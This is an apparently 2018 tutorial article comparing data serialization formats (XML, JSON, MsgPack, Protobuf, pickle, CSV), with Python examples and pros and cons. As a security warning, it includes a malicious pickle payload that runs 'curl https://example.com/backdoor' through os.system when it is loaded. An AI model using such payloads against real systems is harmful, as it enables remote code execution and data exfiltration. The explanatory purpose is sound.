---
title: Data Serialization
permalink: /data-serialization.html
category: Architecture
tags: serialization, rpc, json
date: 2018-06-04
---

# Data Serialization

[[toc]]

## Context

Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream in a format that can be stored or transmitted and deserialize back to origin data structure and code objects.

## Uses

* Store data from memory into databases or disk.
* Transmit data to other processes or services.
* Remove procedure calls.

## Solutions

A list of serialization technology can be found in [Wikipedia - Comparison of data serialization formats](https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats). Below covers the most widely used serialization format in industry.

### XML

XML stands for eXtensible Markup Language. It's designed to store and transport data and human readable. Below is an example serialized data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
  <isbn>9780262510875</isbn>
  <title>Structure and Interpretation of Computer Programs - 2nd Edition</title>
</book>
```

Serialize (in Python 3):

```python
>>> root = ET.Element('book')
>>> isbn = ET.SubElement(root, 'isbn')
>>> isbn.text = '9780262510875'
>>> title = ET.SubElement(root, 'title')
>>> title.text = 'Structure and Interpretation of Computer Programs - 2nd Edition'
>>> ET.dump(root)
<book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>
```

Deserialize (in Python 3):

```python
>>> import xml.etree.ElementTree as ET

>>> root = ET.fromstring('<?xml version="1.0" encoding="UTF-8"?><book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>')

>>> book = {child.tag: child.text for child in root}

>>> book
{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
```

* Advantages:
    * Most languages support XML well.
    * Well adopted in SOAP methodology.
    * Support attributes in a data structure.
    * Good IDE integration.
* Disadvantages:
    * Serialized content is tedious and long. For example, it requires closing tags like `</isbn>`.
    * Usually needs to write extra code to turn XML to code objects.

### JSON

JSON (JavaScript Object Notation) is a lightweight data-interchange format. It's originally a subset of Language JavaScript, however, it's the de facto serialization protocol when providing RESTful API services. Below is an example:

```javascript
{
  "name": "EnqueueZero",
  "description": "Enqueue Zero is creating code principles",
  "homepage": "https://github.com/soasme/EnqueueZero",
  "private": false,
  "has_issues": true,
  "has_projects": false,
  "has_wiki": false
}
```

Serialize and deserialize (in Python 3):

```python
>>> import json

>>> json.dumps({'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'})
'{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}'

>>> json.loads('{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}')
{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
```

* Advantages:
    * Simple and straightforward specification.
    * Widespread Support. Almost all programming languages support serializing and deserializing JSON in their standard libraries.
    * Human readable.
    * Good IDE integration.
* Disadvantages:
    * Limited data types: null, boolean, string, integer, float, object, array. When serializing some non-supported data types, we converted them into string instead, for example, `datetime(1989, 6, 4, 0, 0, 0)` can be translated into ISO8601 format first: `"1989-06-04T00:00:00+0800"`.
    * Performance is not good generally when dataset is huge unless you use a library support streaming parsing or writing.

### MsgPack

MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON. 

Significant difference between JSON:

* Binary format instead of String.
* Small integers are encoded into a single byte
* Short strings are encoded with one extra byte  in addition to the strings themselves.

MessagePack usually doesn't have language built-in library support, therefore you generally need to install a library to serialize and deserialize data. For example, in Python, you can install via `pip`:

```bash
$ pip install msgpack-python
```

Serialize and deserialize (in Python 3):

```python
>>> import msgpack
>>> v = msgpack.packb([1, 2, 3], use_bin_type=True)
'\x93\x01\x02\x03'
>>> msgpack.unpackb(v, raw=False)
[1, 2, 3]
```

* Advantages:
    * Very efficient.
    * Support streaming API.
* Disadvantages:
    * No built-in support in most languages.
    * Hard to debug.

### Protobuf

Protocol Buffers, known as protobuf, is Google's data interchange format originally and has widely used in many other corporations.

Usage:

* Define schemas for data structures in `.proto` file.
* Use the protocol buffer compiler translate proto into a library.
* Use the given API provided by the generated library to write and read messages.

Below is an example `book.proto` file:

```
message Book {
  required string isbn = 1;
  optional string title = 2;
}
```

Generating library is through `protoc` command.

```bash
$ protoc -I=$SRC_DIR --python_out=$DST_DIR $SRC_DIR/book.proto
```

This generates `book_pb2.py` in `DST_DIR`, which is like below. You should never modify below generated file but to modify proto file first and re-generate:

```python
class Book(message.Message):
    __metaclass__ = reflection.GeneratedProtocolMessageType
...
```

Serialize:

```python
>>> import book_pb2
>>> book = book_pb2.Book()
>>> book.id = '9780262510875'
>>> book.title = 'Structure and Interpretation of Computer Programs - 2nd Edition'
>>> book.SerializeToString()
```

* Advantages:
    * Very efficient and impact data.
    * Has tested at scale in industry-level environments.
* Disadvantages:
    * Complicated. Need define `proto` and generate library first.
    * It requires the tool generating library as well. In addition, the generated library needs to exist in both client and server side. This would generally cause problem when schema modified.
    * Hard to debug.

### Thrift

Thrift is similar to ProtoBuf in all likelihood. It shares exact the same processes and concepts like ProtoBuf.

### Language Built-in Serialization

Most languages have their own serialization solutions. There is rare example that data serialized by different languages can be used in other languages. This is mainly because data objects are represented very different in memory.

For example, in Python, you can use pickle and cPickle:

```python
>>> class Foo:
...     attr = 'A class attribute'
...

>>> import pickle
>>> picklestring = pickle.dumps(Foo)

>>> picklestring
b'\x80\x03c__main__\nFoo\nq\x00.'

>>> pickle.loads(picklestring)
<class '__main__.Foo'>
```

Similar classes or interfaces can be found in other languages, for example, Marshal for Ruby, function serialize for PHP, class implemented `java.io.Serializable` for Java, etc.

The deserialization is usually dangerous when in language specific format. Deserialization usually means code execution, and therefore, malformed data from untrusted source can harm the system that runs the program.  It's the worst choice and generally not recommend to use. Below is an example that a pickled data can send server ip to a backdoor service.

```python
data  = """cos
system
(S'curl https://example.com/backdoor'
tR.
"""
pickle.loads(data)
```

* Advantage
    * Can support various data types.
* Disadvantage
    * DANGEROUS!
    * Can't be used in other languages.
    * Hard to debug.

### Others

INI, TOML and YAML are also human readable serialization formats.

|INI|TOML|YAML|
|---|----|----|
|[section]|[section]|section:|
|key=value|key="value"|key: value|

The three serialization formats listed above are often used as configuration file format.

* Advantages
    * Human readable and writable.
    * Well-support libraries.
* Disadvantages
    * Not designed for large dataset.

CSV is also a popular serialization format. It's in plain text format and pretty good for tabular data. Below is an example one row csv file with a header as first line.

```
ISBN,Title
9780262510875,Structure and Interpretation of Computer Programs - 2nd Edition
```

Serializing CSV are pretty easy in Python 3:

```
>>> import csv
>>> with open('/tmp/demo.csv', 'w') as f:
...     writer = csv.writer(f)
...     writer.writerow(['ISBN', 'Title'])
...     writer.writerow(['9780262510875', 'Structure and Interpretation of Computer Programs - 2nd Edition'])
```

* Advantage
    * Human readable and writable.
    * Good for streaming parsing and large dataset.
    * Good for data with same schema.
    * Non-technical folks can open it in Excel or Google Spreadsheet.
* Disadvantage
    * Type is limited. Usually values are considered as string only.
    * No good support for binary data.
    * Data structure is limited. It only fits tabular data.

## Conclusion

* JSON is usually your first choice. It's simple, human readable, and has most widespread support.
* Use MsgPack instead of JSON if performance is an issue.
* Use Protobuf if type check and schema check is essential. gRPC is recommended as an RPC framework based on Protobuf.
    * Use Thrift if you're developing RPC services and don't like Protobuf syntax.
* Use TOML if you're serializing some config files.
* Use CSV if you're serializing data to non-technical people.
    * Use INI if you want something simpler.
    * Use YAML if you want something more complex.
* Use language built-in serialization functions or methods if the use case is only limited in a single language, and you don't care security that much (not good). 

## References

* [Avro](https://avro.apache.org/docs/current/)
* [Comparison of data serialization formats](https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats)
* [Don't pickle your data](https://www.benfrederickson.com/dont-pickle-your-data/)
* [How do I read and write with msgpack](https://stackoverflow.com/questions/43442194/how-do-i-read-and-write-with-msgpack/43442195)
* [Java serialization](https://www.tutorialspoint.com/java/java_serialization.htm)
* [Msgpack official website](https://msgpack.org/index.html)
* [PHP Manual - serialize](https://php.net/serialize)
* [Protocol Buffers](https://developers.google.com/protocol-buffers/)
* [Protocol Buffers, Avro, Thrift & MessagePack](https://www.igvita.com/2011/08/01/protocol-buffers-avro-thrift-messagepack/)
* [Python Manual - json](https://docs.python.org/2/library/json.html)
* [Python Serialization](https://jmoiron.net/blog/python-serialization/)
* [Ruby Manual - Markshal](https://ruby-doc.org/core-2.0.0/Marshal.html)
* [What does Serializable mean](https://stackoverflow.com/questions/3429921/what-does-serializable-mean)
* [What is code serialization](https://stackoverflow.com/questions/447898/what-is-object-serialization)
* [Wikipedia - Serialization](https://en.wikipedia.org/wiki/Serialization)
* [XML](https://www.w3schools.com/xmL/default.asp)
* [You're Using JSON, Why not MessagePack](https://news.ycombinator.com/item?id=2571729)

## Credit

* [@vovanz](https://www.reddit.com/user/vovanz): helped on performance and JSON streaming API.
* [@Dogeek](https://www.reddit.com/user/Dogeek): helped on configuration serialization.
* [@tannhaeuser](https://news.ycombinator.com/user?id=tannhaeuser): helped on CSV piece.

## Discussion

* [Hackernews](https://news.ycombinator.com/item?id=17226781)
* [Reddit](https://www.reddit.com/r/Python/comments/8ogk5o/which_is_your_first_choice_of_data_serialization/)
